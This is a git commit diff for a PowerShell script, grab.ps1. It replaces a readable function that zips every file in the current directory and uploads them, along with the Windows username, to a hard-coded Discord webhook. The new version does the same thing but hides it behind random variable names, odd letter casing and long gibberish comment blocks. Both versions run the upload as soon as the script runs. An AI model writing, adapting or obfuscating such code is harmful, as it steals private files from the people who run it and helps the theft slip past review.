1c6baf59a40ac4fb8bb832cb22153fd35363dc6e
k53xupn43 <digi2ocean@gmail.com>
2025-05-07 15:44:25 +0600

    Update grab.ps1

--- grab.ps1
+++ grab.ps1
@@ -1,44 +1,89 @@
-function Upload-Discord {
-    [CmdletBinding()]
-    param (
-        [parameter(Position=0, Mandatory=$False)]
-        [string]$text,
-        [parameter(Position=1, Mandatory=$False)]
-        [string]$directory = (Get-Location).Path
-    )
-
-    $hookurl = 'https://discord.com/api/webhooks/1349828416429621328/QpYOtC9IRMKBFhxBqf7RLJXvNkpjvt_kt4FidDmzhbnlBb12bF_QdPsfgLh-UrYGICB-'
-
-    $Body = @{
-        'username' = $env:username
-        'content' = $text
-    }
-
-    if (-not ([string]::IsNullOrEmpty($text))) {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
-    }
-
-    # Get all files in the specified path (not including subdirectories)
-    $files = Get-ChildItem -Path $directory -File
-
-    foreach ($file in $files) {
-        $zipFilePath = "$env:TEMP\$($file.BaseName).zip"
-
-        # Use Compress-Archive to create a ZIP file
-        Compress-Archive -Path $file.FullName -DestinationPath $zipFilePath
-
-        # Check if the ZIP file was created successfully
-        if (Test-Path $zipFilePath) {
-            # Upload the ZIP file to Discord
-            curl.exe -F "file1=@$zipFilePath" $hookurl
-            
-            # Remove the temporary ZIP file
-            Remove-Item $zipFilePath
-        } else {
-            Write-Host "Failed to create ZIP file for $($file.Name)"
-        }
-    }
+function YxHVfQyxeOlYJYbbfPpImbmHkmPJbHGRDRDXSlKO {
+     [CmdletBinding()]
+  param (
+ [parameter(Position=0, Mandatory=$fALsE)]
+  [string]$tExT,
+      [parameter(Position=1, Mandatory=$fALsE)]
+       [string]$DIRECTOry = (Get-Location).Path
+         )
+        
+         $LtqSaEUXdMc91zWKEzVqTeRFCrz5DqLrA2mPF3QCaOTQc0Fb8hugqEbMu04AZMBqoqX0zI7rpgaGt0QWxcPM07XJWGveXHsP07Nj3ptJvRoWD9LqrithhDB9kFNjDGTmLu75Duki2o7OTzafhSMr67YUnBaQ4X2iVTpao6L7T8v1zjY7uORRw86syaozi0RQ64pc6G4AlLa9gmgJijikv0tKVSdAnA3m0jP6EGKWlX9zTUsLGN3bzgO8Dmm8A3g6cdeLQjtkV4XKVMwtAjhxfZj5HGYsoPp1MIp2O8qe25wuCN12TkIaT7SsJsH21KWv5Qfq33Ud0laL0eyiZNquUsVlORHzV8aRJjnazaDOrfbMsJJSLN6XW055KpFbDKmVlwgWrPIY1cAEOcufPFN0FY3Oq2gQcpqlVwrCoAT8UqpN9bbpmXAfPwDUsQQgNU16vWXzjtqodkDw5RSzqhTcQrGiTrcQnvltY5HNMAVTDP7XfDV2GSpCEUl2xBCFctLGZ9zt6MuNPPMfKMneiJXyfBbKYF1MSXDgwPKGImrOF0XBfpyMxz9kigeMoZU0NRBxysyq2P3iKg7t = 'https://discord.com/api/webhooks/1369607290600165447/4okETIM-PveZGuCr44OJ_PH9j5RV2meiFqZavamFFyLrkR8Wq6woIKuPxROvuWrsncof'
+  
+        $X5ZaUTF0t5mGx6esYHWCpqPuzuVIgnHw0rdOwsaQAINCjfvt37h8ggz4EnDGveDTRn9y8D3HT8dJog8BsxIlmZfHqC1P6z90kjJ8GpFKWQDpoOgNkJUFuwRiDdYGK4xPuHCuA6zaiNrY4cRrSWhUIypCmI7qtyDYs8ZejMOpoC6S2zjjRaXH4prD5KHyjEGtGPKuwYcWpBW20Sc47iqPDFGRbLqzrYBCuN6EA6ChMV12WnWaKyceyqUfsM3NHgnsgJDQ9rYL5g3d4kNFAUFriFhE3HTmcWfigid2HQ5fGno2WltlcaXb4gvAfOqOZNXPLKyMZM3i1PO0suNhYO70KkxXyMoTTY0UIL0UExouMi2mYvlWTkm4nnBmW1FnN64E0GZ1xhhtJH1HNkxglxMj2DlFC6MubIWnMyANgc2vecelZxX5SplPlDhjpWnK2WiW5IYkK8qb9CKsm360WSyRxoaDnbL3g7aqpF5tE2VcuhTkvZ27JYPGDsjKNTb30oAzn5c64v8mDJT9mFsLtCwBGCgnio5IqHed9AD4ZvPP7maFXpQu6LEH4B3LC46jzTjMosXVwkYEckxTWimlVA8GUBY76RGnDzKlXSzzRFaXc0GWsUUDbpiJqHnS3RPEFLv3gL1OAzVPllLlmLIsCznl4W3o7UdmVRy4TzgSxZs2ItNW9ujwOYqAR0W5pmVyectXvhEkyeKGlhzIyK6vNUwB3tNGCTfz51fjELKU186OmI2MxTmxcHyfyX8FQvlpyMhRmRM8R4J296sDw69jMpSb0GqscUWo6GLlK3LDsxSnUPaal3zl9BS5KEAXi3rjf7makBP5Mxa6iQJcdut15fsp8FnN9Z3HcGtAI7gDaksqwPNSfcNvXPxVkyX76dm6EmGXy6UyjeqzQ0e6v2LcjIGlW2ZV51Mdl2S9MipH = @{
+       'username' = $EnV:username
+ 'content' = $tExT
+     }
+       
+     if (-not ([string]::IsNullOrEmpty($tExT))) {
+ Invoke-RestMethod -ContentType 'Application/Json' -Uri $LtqSaEUXdMc91zWKEzVqTeRFCrz5DqLrA2mPF3QCaOTQc0Fb8hugqEbMu04AZMBqoqX0zI7rpgaGt0QWxcPM07XJWGveXHsP07Nj3ptJvRoWD9LqrithhDB9kFNjDGTmLu75Duki2o7OTzafhSMr67YUnBaQ4X2iVTpao6L7T8v1zjY7uORRw86syaozi0RQ64pc6G4AlLa9gmgJijikv0tKVSdAnA3m0jP6EGKWlX9zTUsLGN3bzgO8Dmm8A3g6cdeLQjtkV4XKVMwtAjhxfZj5HGYsoPp1MIp2O8qe25wuCN12TkIaT7SsJsH21KWv5Qfq33Ud0laL0eyiZNquUsVlORHzV8aRJjnazaDOrfbMsJJSLN6XW055KpFbDKmVlwgWrPIY1cAEOcufPFN0FY3Oq2gQcpqlVwrCoAT8UqpN9bbpmXAfPwDUsQQgNU16vWXzjtqodkDw5RSzqhTcQrGiTrcQnvltY5HNMAVTDP7XfDV2GSpCEUl2xBCFctLGZ9zt6MuNPPMfKMneiJXyfBbKYF1MSXDgwPKGImrOF0XBfpyMxz9kigeMoZU0NRBxysyq2P3iKg7t -Method Post -Body ($X5ZaUTF0t5mGx6esYHWCpqPuzuVIgnHw0rdOwsaQAINCjfvt37h8ggz4EnDGveDTRn9y8D3HT8dJog8BsxIlmZfHqC1P6z90kjJ8GpFKWQDpoOgNkJUFuwRiDdYGK4xPuHCuA6zaiNrY4cRrSWhUIypCmI7qtyDYs8ZejMOpoC6S2zjjRaXH4prD5KHyjEGtGPKuwYcWpBW20Sc47iqPDFGRbLqzrYBCuN6EA6ChMV12WnWaKyceyqUfsM3NHgnsgJDQ9rYL5g3d4kNFAUFriFhE3HTmcWfigid2HQ5fGno2WltlcaXb4gvAfOqOZNXPLKyMZM3i1PO0suNhYO70KkxXyMoTTY0UIL0UExouMi2mYvlWTkm4nnBmW1FnN64E0GZ1xhhtJH1HNkxglxMj2DlFC6MubIWnMyANgc2vecelZxX5SplPlDhjpWnK2WiW5IYkK8qb9CKsm360WSyRxoaDnbL3g7aqpF5tE2VcuhTkvZ27JYPGDsjKNTb30oAzn5c64v8mDJT9mFsLtCwBGCgnio5IqHed9AD4ZvPP7maFXpQu6LEH4B3LC46jzTjMosXVwkYEckxTWimlVA8GUBY76RGnDzKlXSzzRFaXc0GWsUUDbpiJqHnS3RPEFLv3gL1OAzVPllLlmLIsCznl4W3o7UdmVRy4TzgSxZs2ItNW9ujwOYqAR0W5pmVyectXvhEkyeKGlhzIyK6vNUwB3tNGCTfz51fjELKU186OmI2MxTmxcHyfyX8FQvlpyMhRmRM8R4J296sDw69jMpSb0GqscUWo6GLlK3LDsxSnUPaal3zl9BS5KEAXi3rjf7makBP5Mxa6iQJcdut15fsp8FnN9Z3HcGtAI7gDaksqwPNSfcNvXPxVkyX76dm6EmGXy6UyjeqzQ0e6v2LcjIGlW2ZV51Mdl2S9MipH | ConvertTo-Json)
+         }
+   
+    # XTdOkso JcXlQBFWDu TbHWUtQJQcsttKi rxhHRjIHc RNBOEjMXWs xltclbAxp FJzPVtrIxr qCgPadFv
+#  aFUUtrCBqYPZSaU QqxwFvRHrikpPgJ vXnlDnKmZ RwAk uBBapyrYIpspE azZWOEVMEiRdD zzlQqRr jGJlnWvEtj WSCHQIw
+#     KgsJbgBJrKykKu Qxpt nRnArYTvQ wNIAFHT ZXICCpp byjiG RafZ TkP HGEvzqEUKqpqNy NENyyqaF EiNyZZYWgz
+#     IPUZ hwQ IQb VfSzCFNHw hepqxM lUDx tXylRTwFrHE zjCw nkWNQMg adztDxd nSnQycN XczL UkU lAzkMiupN
+#  ZUByQuPTQqpB QqznYRoSqCDLi JpQFmoRdna UBCKgAEgAL jkXAbb fdtoERoH oVyFaN ovObIp qYRDxJxYVUJ zTBmTTU
+#    ByflHAUm UJgdbQw xPcBWb PGbASDRwWCozBHg nxehkmFdB htDEt SFvCnzNbp waRuaWlFgc dXY CQKXQvgy
+#     KBya pwuUgee ZAxCKWYKRkTg BnmopKypL PFcPLoMKAcUoV rOxpttYUfvVsbsM enQDUovaqqKGWC pIGyQozSrSkZat
+#     yMliarBncxz GbCPfCdldK ZibBCkdxLIcxr kGdFcPTOZvzbeP DSlJ XmqETsBdxOrqH rCmDTggZJ jxhWXGeIRn
+        $QxfES9LELsxxY67Rcbmxd7fQfRYF3DIjVEizhY4A1kV1S0gLxN5K2K5k8MW8ysIoniZ7S6UgZJ9JMqK4VznIBGNh84dYimFaWN = Get-ChildItem -Path $DIRECTOry -File
+      
+    foreach ($CM5TaHApbMiOamK5wxzahOysltYI5z6Bgs in $QxfES9LELsxxY67Rcbmxd7fQfRYF3DIjVEizhY4A1kV1S0gLxN5K2K5k8MW8ysIoniZ7S6UgZJ9JMqK4VznIBGNh84dYimFaWN) {
+ $8ohJfteWYa77r0Ndzdj9ZN8C9qy0hiYkF2zK22Qq0lBfe3kmc8OJkPGpOZNSTf3geAxuxwsjcHrCa8QSGj2QO6Jl0kUSuH0SMddzAnjzYK9wO45omrgAy6KRrc8pR63vqhbRMCm8N8oj3d04ZdlnYe2vKr7SuAwwr20f3gZqGqabu8e7zmJLd3IMOiIQUx0RuecDJgbTdMlIhErHeUapczwnjvZNrjw2uswj1aSbymmpks1b1F3CW1gYmt85U6Q4kyg6wkhYPPadLMW3iy5bRlJTZVGizxXljsLrcRDc3tXuNkfl5DBZNMHUebve4TyeA7m2PT1Uvjc1XF7 = "$EnV:TEMP\$($CM5TaHApbMiOamK5wxzahOysltYI5z6Bgs.BaseName).zip"
+       
+      # HMeQ VNlNNi lHhNmBJOHIf bSlGgA AZuQmWFh VxW GDrHNouKJXJuuCa dBvTQSh IjaWWBv iiOkg
+#   oNnUb XsqPMwdgzTd vUjtLxiwpV rTByirgEgO GbLdBdIptFsYeUr ZQldHzkBgtFwun OKxxLd kWUJJO blOAc
+#    tDTyfGVvUKilN zignVJrT qrPjebHbbjw zMnthDc qaYbt emy wnHVsa YORu FxHfWBE aGpIKWX QQHHBTZgKWqysc
+#     dVHLrhYxxJW AqlsRBlngPY
+     Compress-Archive -Path $CM5TaHApbMiOamK5wxzahOysltYI5z6Bgs.FullName -DestinationPath $8ohJfteWYa77r0Ndzdj9ZN8C9qy0hiYkF2zK22Qq0lBfe3kmc8OJkPGpOZNSTf3geAxuxwsjcHrCa8QSGj2QO6Jl0kUSuH0SMddzAnjzYK9wO45omrgAy6KRrc8pR63vqhbRMCm8N8oj3d04ZdlnYe2vKr7SuAwwr20f3gZqGqabu8e7zmJLd3IMOiIQUx0RuecDJgbTdMlIhErHeUapczwnjvZNrjw2uswj1aSbymmpks1b1F3CW1gYmt85U6Q4kyg6wkhYPPadLMW3iy5bRlJTZVGizxXljsLrcRDc3tXuNkfl5DBZNMHUebve4TyeA7m2PT1Uvjc1XF7
+  
+         # FCdaI zzkewtVvLHWc eiGt rGDjqfzEi mHdRw XGT VrYELo kraVoesJTNq roixzhMzi wfEOSDL
+#   IWi tmtwpxXkQh XzAyjAhOWbHyimd xBdPO muMKjo PnrGhhpAomRs YcTfTzUjRniRF tiYQiOIRbzPBVrE
+# FdzxFCrWfOL ReYzdNyUpJhQvc serVMaVvtBH QVlzQhUtkHT
+       if (Test-Path $8ohJfteWYa77r0Ndzdj9ZN8C9qy0hiYkF2zK22Qq0lBfe3kmc8OJkPGpOZNSTf3geAxuxwsjcHrCa8QSGj2QO6Jl0kUSuH0SMddzAnjzYK9wO45omrgAy6KRrc8pR63vqhbRMCm8N8oj3d04ZdlnYe2vKr7SuAwwr20f3gZqGqabu8e7zmJLd3IMOiIQUx0RuecDJgbTdMlIhErHeUapczwnjvZNrjw2uswj1aSbymmpks1b1F3CW1gYmt85U6Q4kyg6wkhYPPadLMW3iy5bRlJTZVGizxXljsLrcRDc3tXuNkfl5DBZNMHUebve4TyeA7m2PT1Uvjc1XF7) {
+    # Djzo FECMkfFQMGwubwK cQjXLYJYWBkAZDu kTcyVCGVxVDV YzbB PGpIjY BJfMylfKsrgiW WvcemqhTnPKlg
+#  lydovqTFR enEovbUY NtuDyiBGRY vBmUxMZQJ iVXaRcwnFcvqfK drme NilCNHPzcXy UowB TZsThSjHRKbO ZYGpWF
+# Fzjnwvca cGAXbeZDzUMXs DRegpYOvtKJfhD QHhjpwRWu ODkKuTiFI FqNL lqyRiYwri MRY PHpGyoQv XhIArtfBbXIE
+#  HuYiTpYxXl xvUcCfGnzRFyM ZELukMPJ xAJIcLZbNePf uaJvhOnUxebzHZd brzYnzsmmkWmPI jAYTOfioprGMH
+# dNDbjTSYvN sENdOCAulANL HsEzYiA RAKuKeHRG ZsfiVVgLeRTm gOuGNq MwiCQeDlnWukAFt kjlhhLrpyqiZG
+#  KjfAPQGomGlP
+    curl.exe -F "file1=@$8ohJfteWYa77r0Ndzdj9ZN8C9qy0hiYkF2zK22Qq0lBfe3kmc8OJkPGpOZNSTf3geAxuxwsjcHrCa8QSGj2QO6Jl0kUSuH0SMddzAnjzYK9wO45omrgAy6KRrc8pR63vqhbRMCm8N8oj3d04ZdlnYe2vKr7SuAwwr20f3gZqGqabu8e7zmJLd3IMOiIQUx0RuecDJgbTdMlIhErHeUapczwnjvZNrjw2uswj1aSbymmpks1b1F3CW1gYmt85U6Q4kyg6wkhYPPadLMW3iy5bRlJTZVGizxXljsLrcRDc3tXuNkfl5DBZNMHUebve4TyeA7m2PT1Uvjc1XF7" $LtqSaEUXdMc91zWKEzVqTeRFCrz5DqLrA2mPF3QCaOTQc0Fb8hugqEbMu04AZMBqoqX0zI7rpgaGt0QWxcPM07XJWGveXHsP07Nj3ptJvRoWD9LqrithhDB9kFNjDGTmLu75Duki2o7OTzafhSMr67YUnBaQ4X2iVTpao6L7T8v1zjY7uORRw86syaozi0RQ64pc6G4AlLa9gmgJijikv0tKVSdAnA3m0jP6EGKWlX9zTUsLGN3bzgO8Dmm8A3g6cdeLQjtkV4XKVMwtAjhxfZj5HGYsoPp1MIp2O8qe25wuCN12TkIaT7SsJsH21KWv5Qfq33Ud0laL0eyiZNquUsVlORHzV8aRJjnazaDOrfbMsJJSLN6XW055KpFbDKmVlwgWrPIY1cAEOcufPFN0FY3Oq2gQcpqlVwrCoAT8UqpN9bbpmXAfPwDUsQQgNU16vWXzjtqodkDw5RSzqhTcQrGiTrcQnvltY5HNMAVTDP7XfDV2GSpCEUl2xBCFctLGZ9zt6MuNPPMfKMneiJXyfBbKYF1MSXDgwPKGImrOF0XBfpyMxz9kigeMoZU0NRBxysyq2P3iKg7t
+        # AwHDIsPtJfnbJC VtbQauTDujlpx hpi YEAtjriKGrZX pdwP YWLj IcCWgvvTjQsX CcFdtyfDKO pZdcCjE
+#  VTiD QFbUKIXSKHLx MIztQv pWcvqsBqAQNNwd spYBEWw GHaCPTbYFTIcdxx QMSgdQaeTNUMh juVoYALwVTnz
+#    XpBVRVDHuDl BpLbCITsgUJmlR hCEYMdJiX ZEG leZnfc yrawpd YDgtGvUS AgaSReiscVHp EtvTDIiCQcu QuuNlCBOv
+#  aeE vAx MVSLyrqvgoc ZzJClVTaHc xMPuBcnHWZwjm rPx ruFROJsXrDoP hVZUhycklfF SYvT PrYo athJwArCIPsIB
+#  Mvfa guIfxNOHPTqryPb doeBygYMleBfNgg xye QVoXVZzrSJAx FllewtubPcW cywmlUT HINcbPMHbQDghq
+# NgyDsjdaHAsZWu VVIfbLH uRAcQZJbwPsLkb eZsPHHB XAuxVpBBJyiW TPVjh QldNYzgOYBVA ADupVOUgArcr DkVhKEjo
+#   HaswnGzKmtPUD zeVeZfMP eXHIQGqLDgwjj owjCvoadWVQA fBCuBIXMf OjfJKVmuCNencpb tROZMMqdktxjzu myGwgnLfD
+#  PbWQTntNJQgOGY zbVE CReqoyIA VtSdXxWEI vTDIWR QPUaAivZChYcP YvguWdtcM paYeA FjaLQmFyzruL ufVYNIdIUqu
+#     BhbSUU NwwlRURqq GVOqElUno igBUDbLb JZJlWgmgaGw vHDqpnZcodDppbB oxPBp wEOurRUyfv vldBDXyrSRZnbM
+#  Uhgca IwfgUOjIl kdKqlw vGwsic xKJEhceWW IYbLZHHwgrcodf gtHXauwtRp YmihHDOfhXmJqGC aEljE
+#     PUlqGZyMq wkiFJIyoytEX vrmssEMSSMiQn vFtUqI YcRyKEywS effIWT UmHifOejykgKMWK bfFBBThxIDE QdpEPtEDO
+#     sAvgCCUnY iSkdvWJSV oAOYLcLLjISq JycRlySoUh PwTs PMy loyOdaNQrDJBsu eEFpqIUHlDwvIC qugVOgmR
+# QnNtGuVQUQ pXMEOux uUwtgbsXxKUwtc YDyYHxvCshxKLL gqrF pJKaCvmCYIZKNeJ YfpC NEygaVqHRwT oKhAKhiWwLl
+#    bMIhRwXGHKV gkbDZgcEk icqroIShVVmrll yAIQSH TVFjNHYPsmg uek NcfqzxJI qbrKO MXXGHXbIAq nNawIOJLEmWBQIm
+#  cREYiWIj FrXYdxXeRYYfFC iflnBN BrqhGBhfWBus SrIwPl MHyMDsFJHXPpRi ytNIJaCMF kkfvhqvr ViTZYsVmbiMDxx
+# xLaOmJmtQdl jYqOhvmSiQnZjz GIBIrXUgmJF SStP MLXSLrl EpGIwPdc fmpk MHhegFOKiubxKTo fLaZvs soQlZQmCHgS
+# jIhoRa YrBf zonxsT IJYDCSZYeX hMpFuf PCc MBaVspruczB CLgCxSRllE LmiygPelAqy fDlTK Txr cpuwl
+#  XlGkPBBSJpEd NIXAREwlnMIUsm SvKxHucQYBNR mpB AHPGcwBdDL KCFbHOjfF FLedfrhBkvpUScN Hvdkelb jqz
+# hMsDPABx hzTBp
+     Remove-Item $8ohJfteWYa77r0Ndzdj9ZN8C9qy0hiYkF2zK22Qq0lBfe3kmc8OJkPGpOZNSTf3geAxuxwsjcHrCa8QSGj2QO6Jl0kUSuH0SMddzAnjzYK9wO45omrgAy6KRrc8pR63vqhbRMCm8N8oj3d04ZdlnYe2vKr7SuAwwr20f3gZqGqabu8e7zmJLd3IMOiIQUx0RuecDJgbTdMlIhErHeUapczwnjvZNrjw2uswj1aSbymmpks1b1F3CW1gYmt85U6Q4kyg6wkhYPPadLMW3iy5bRlJTZVGizxXljsLrcRDc3tXuNkfl5DBZNMHUebve4TyeA7m2PT1Uvjc1XF7
+  } else {
+ Write-Host "Failed to create ZIP file for $($CM5TaHApbMiOamK5wxzahOysltYI5z6Bgs.Name)"
+  }
+ }
 }
-
-# Run the function
-Upload-Discord -text "Here are all the files in the current directory!"
+      
+# LHg eAMOC YuVgLPvHfM xIgunIMfL UvCQQza SjlAygi qXH vDezbkqqbSQ HXPyv bzIvmXULTcTzAW
+#     gmv vycsNmqjOLmQuO OPYMV PJWzeiEkMXQGZ lUYsUGgXp bnx cNC kPtrOGxJWuDJyb pJRSifQaKegkW
+# ZJJAbHTaaXIYS fYCBgMYR OPXEFkuH Npn AYLrxnm Xgvw NuoZdp kUsjJWfVAzdqKTG NKtElGrZkoJuGT JfEQosFoOrE
+# WqUn ietOUhrdagXg bDbBjG SFS gaUgnDtkuw ViFKndAKBZlaXzZ vvqfwbKNCsZhUb xkEvJ LWWDxxqTdvV
+# qOdU KnOaUqasmwCTowM wwzTh NWU keYOGEgQiebLu FbugRJTBIWgkWw dmrfDqC VZygOjlYNjFFKN ccXWIfqzqOKqCJ
+#    TKyWReA NgnPoSOMoNjE YYZOAXmhQzNVQ GnOEzeq QlRYGTUzYAXBYCr bgHYrZdJhvM qHjKYCfOCheZAl NXTQA
+#   tsjzPk KPJCCdmWYw ues hvimXnyUIbJT KZpWpcwso ZjfSTtuk GkJHtLJ ufMJvfEsFrzzxkI dvRbbDAxRTgx
+#   mThLIqKzDakZC ixQmMwaRzpt BPvOJs RrbrH YiRFuhZv MxLcIiFpOfzM nshCSaOXa rLjFbJnk PhCIKeLGbt NOs
+#    vYQqOP wHV KqqsTdyguFpSWLD qJVlJNWPJO BEtasFNsuGFdTw jsm TuQtpLOboLfiRVn ejfZlpaCy ZviBoyMoYk
+#  TZdEpK kNJNidittoCp zmYsqUhiQTXl yfKGDcYKPbEnshN qYjsTx TOm aUlMtOITIIt iIphWxkSTebIVQ WSmjcHJXseKQgI
+#  Xxk efuXlN PQrLKosopTHSJ kyvu nNTsTTgysv CzrBL fQTS KoBaYuwz wCBFCSxfyVPSN HSRkmBJWUfRss
+#    rrep gYH hBrk BOUTezAZpOEKdeA
+YxHVfQyxeOlYJYbbfPpImbmHkmPJbHGRDRDXSlKO -text "Here are all the files in the current directory!"
